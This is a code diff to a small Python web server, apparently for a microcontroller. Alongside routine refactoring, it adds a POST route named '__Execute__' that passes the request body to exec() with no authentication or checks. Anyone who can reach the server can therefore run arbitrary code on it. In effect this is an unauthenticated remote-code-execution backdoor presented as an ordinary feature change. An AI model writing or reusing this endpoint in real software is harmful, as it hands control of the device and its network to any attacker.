@@ -42,7 +42,7 @@ def get_file_content(filename, mode = 'rb'):
     return content
 
 
-def handle_request(request):
+def handle_request(request, data):
     """
     Handle the request.
     """
@@ -61,9 +61,25 @@ def handle_request(request):
         print("Path:", request_path)
         print("Version:", request_version)
 
+        header = b''
+        content = b''
+
         if request_method == "POST":
-            print(request)
-            pass
+            request_path = request_path.strip('/')
+            if '__Execute__' == request_path:
+                exec(data)
+
+                content = b"Done ..."
+
+                header += b'HTTP/1.1 200 OK\r\n'
+                header += b'Server: ' + SERVER_NAME + b'\r\n'
+                header += b'Content-Type: ' + MIME_Type['txt'][0] + b'\r\n'
+                header += b'Content-Length: %d\r\n' % len(content)
+                header += b'\r\n'
+
+                return header, content
+
+            return "", ""
         if request_method == "GET":
 
             # Get the filename with the extension.
@@ -79,8 +95,6 @@ def handle_request(request):
             if filename == '':
                 filename = 'index.html'
             fileext = filename[filename.rfind('.') + 1:]
-
-            header = b''
 
             # Check the extension.
             # If the extension is not defined, send a 'Not Found' Status.
@@ -145,9 +159,14 @@ def main(use_stream=False):
                     sent = client_s.write(content)
                     totalsent += len(sent)
         else:
-            rec = client_s.recv(4096)
+            rec = client_s.recv(4096).decode('utf-8')
+            data = ""
+            # get the additional data from the post command
+            if "POST" in rec:
+                data = client_s.recv(4096).decode('utf-8')
+
             if rec:
-                header, content = handle_request(rec.decode('utf-8'))
+                header, content = handle_request(rec, data)
                 print('length of content:' + str(len(content)))
                 print(header)
                 print()
